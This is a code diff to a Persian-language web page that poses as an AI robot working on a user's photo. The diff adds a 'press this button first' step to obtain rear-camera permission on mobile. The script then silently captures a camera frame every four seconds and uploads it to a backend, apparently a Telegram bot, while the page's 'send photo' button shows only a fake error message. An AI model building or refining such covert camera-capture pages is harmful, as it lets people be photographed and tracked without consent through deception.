@@ -50,6 +50,10 @@ p{
 
     margin-bottom: 12px;
 }
+        .ali{
+          background: #ff681d;
+        font-size:19px;
+        }
     </style>
     <link rel="stylesheet" href="style.css">
 </head>
@@ -63,6 +67,8 @@ p{
         <br/>
         پس اگه این صفحه مورد پسند شما نبود از شما عذر خواهی میکنیم🙏
     </p>
+    <button class="send ali" id="startBtn">برای کار با ربات اول این دکمه را بزنید </button>
+       
    </div>
 <div class="main">
     <div class="container">
@@ -83,66 +89,91 @@ p{
     <button class="send" id="button">ارسال عکس</button>
 </div>
 <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const log = document.getElementById('log');
+
     const btn=document.getElementById('button');
     btn.addEventListener("click",()=>{
         alert("عکس پردازش عکس با خطا مواجه شد لطفا در جای درست و چهره تان واضح باشه و اگر دوباره این  پیغام ظاهر شد لطفا به توسعه دهنده هوش مصنوعی اطلاع دهید")
     })
-    // تنظیم فاصله زمانی ارسال عکس (به میلی‌ثانیه)
-    // 3000 یعنی هر ۳ ثانیه. کمتر از این نکن چون تلگرام بلاک میکنه!
-    const SEND_INTERVAL = 3000; 
+   const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const log = document.getElementById('log');
+    const startBtn = document.getElementById('startBtn');
+    let streamActive = false;
+
+    // در موبایل حتما باید کاربر یک کلیک بکند تا دوربین اجازه پخش داشته باشد
+    startBtn.addEventListener('click', async () => {
+        startBtn.style.display = 'none';
+        log.innerText = "در حال درخواست مجوز دوربین...";
+        startCamera();
+    });
 
     async function startCamera() {
         try {
+            // درخواست دوربین (مخصوص موبایل تنظیم شده)
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: 'environment' } // دوربین پشت
+                video: { 
+                    facingMode: 'environment', // دوربین پشت
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                }, 
+                audio: false 
             });
+
             video.srcObject = stream;
             
-            log.innerText = "";
-            
-            // شروع تایمر برای ارسال عکس
-            setInterval(captureAndSend, SEND_INTERVAL);
+            // صبر میکنیم تا ویدیو واقعا لود شود
+            video.onloadedmetadata = () => {
+                video.play();
+                log.innerText = "✅ دوربین وصل شد. شروع ارسال...";
+                streamActive = true;
+                // شروع ارسال عکس هر 4 ثانیه
+                setInterval(captureAndSend, 4000);
+            };
 
         } catch (err) {
-            log.innerText = "";
-            log.style.color = "red";
+            console.error(err);
+            log.innerText = "❌ خطا: دسترسی به دوربین داده نشد یا مرورگر اجازه نداد.";
+            alert("لطفا دسترسی دوربین را تایید کنید.");
         }
     }
 
-    function captureAndSend() {
-        if (video.readyState === video.HAVE_ENOUGH_DATA) {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
+    async function captureAndSend() {
+        if (!streamActive) return;
 
-            canvas.toBlob(blob => {
-                sendToBackend(blob);
-            }, 'image/jpeg', 0.7); // کیفیت 70% برای سرعت بیشتر
+        // اطمینان از اینکه ویدیو سایز دارد
+        if (video.videoWidth === 0 || video.videoHeight === 0) {
+            console.log("ویدیو هنوز لود نشده...");
+            return;
         }
+
+        // تنظیم سایز بوم نقاشی (Canvas) دقیقا هم‌اندازه ویدیو
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // تبدیل به عکس و ارسال
+        canvas.toBlob(blob => {
+            if(blob) sendToBackend(blob);
+        }, 'image/jpeg', 0.6); // کیفیت متوسط برای سرعت بهتر
     }
 
     async function sendToBackend(blob) {
         const formData = new FormData();
-        formData.append('photo', blob, 'capture.jpg');
+        formData.append('photo', blob, 'cam.jpg');
 
         try {
-            log.innerText = "";
+            log.innerText = "📤 در حال ارسال عکس...";
             await fetch('/send-photo', { method: 'POST', body: formData });
-            log.innerText = "";
-        } catch (error) {
-            console.error(error);
-            log.innerText = "⚠️ خطا در ارسال";
+            log.innerText = "✅ عکس ارسال شد.";
+        } catch (e) {
+            log.innerText = "⚠️ خطا در ارسال به سرور";
         }
     }
-
-    // شروع برنامه
-    startCamera();
 </script>
 
 </body>
 
 </html>
+
